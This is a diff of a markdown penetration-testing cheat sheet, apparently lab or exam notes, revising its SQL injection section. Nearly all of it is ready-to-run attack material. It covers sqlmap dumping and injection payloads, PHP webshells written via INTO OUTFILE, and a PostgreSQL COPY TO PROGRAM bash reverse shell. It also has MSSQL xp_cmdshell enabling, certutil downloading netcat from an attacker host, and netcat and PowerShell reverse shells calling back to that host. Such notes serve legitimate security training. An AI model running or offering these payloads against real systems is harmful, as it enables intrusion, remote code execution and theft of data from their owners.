@@ -542,7 +542,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     MYSQL: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`  
     MSSQL: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
   - SQLMap
-    `sqlmap -r post.txt --batch --level=5 --risk=3 --dump`  
+    `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`  
   - simple payloads
     - error
       `' OR 1=1 --`  
@@ -552,26 +552,27 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - booloan
       `offsec' AND 1=1 -- //`
     - time-based
-      `offsec' AND IF (1=1, sleep(3),'false') -- //`  
-      `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
+      MySQL: `offsec' AND IF (1=1, sleep(3),'false') -- //`  
+      MSSQL: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
       Postgresql: `' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- HlYW`
   - ❗**PostgreSQL: COPY … TO PROGRAM**  
-    `<PARAM>=1'; COPY (SELECT '') TO PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/<kali>/80+0>%261"`  
+    `<PARAM>=1'; COPY (SELECT '') TO PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/<kali>/80+0>%261"`
   - ❗**MySQL: SELECT … INTO OUTFILE**  
-    `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';`  
-  - ❗**MSSQL: xp_cmdshell**  
-    `EXEC xp_cmdshell 'nc.exe <kali> 80 -e cmd.exe';`  
-    `EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://<kali>/shell.ps1'')"';`    
-  - xp_cmdshell
+     `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
+     `<target>/tmp/webshell.php?cmd=id`  
+  - ❗**MSSQL: xp_cmdshell**
+    sql probe: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
+    
+    [nc64.exe】(https://github.com/int0x33/nc.exe/blob/master/nc64.exe)  
     ```
-    impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-    EXECUTE sp_configure 'show advanced options', 1;
-    RECONFIGURE;
-    EXECUTE sp_configure 'xp_cmdshell', 1;
-    RECONFIGURE;
-    EXECUTE xp_cmdshell 'whoami';  
-    ```
-  - Bind reverse shell
+    (kali㉿kali)-[/var/www/html]
+    └─$ sudo python3 -m http.server 80
+
+    ';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+    ';EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe c:/windows/temp/nc64.exe";--
+    ';EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe <kali> 4444 -e C:\Windows\System32\cmd.exe";--
+    ```    
+  - Bind reverse shell (powershell -e)
     - Generate Base64 in kali or https://www.revshells.com/ (PowerShell #3 Base64)  
       ```
       pwsh
@@ -586,22 +587,6 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - upload a PHP Backdoor from SQL  
     `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
     `192xxx/tmp/webshell.php?cmd=id`  
-- 💣 get reverse shell
-  1. SQL probe username/password textbox  
-     `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
-  3. Host nc64.exe on a Web Server  
-     ```
-     wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
-
-     sudo mv nc64.exe /var/www/html/
-     sudo python3 -m http.server 80
-     ```
-  5. Start a listener on Kali  
-     `nc -lvnp 4444`
-  7. Use xp_cmdshell download Netcat  
-     `'; EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe C:/Windows/Temp/nc64.exe";--`  
-  9. Trigger Reverse Shell  
-      `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`  
 
 # Public exploit  
 - Search exploit by service + version  
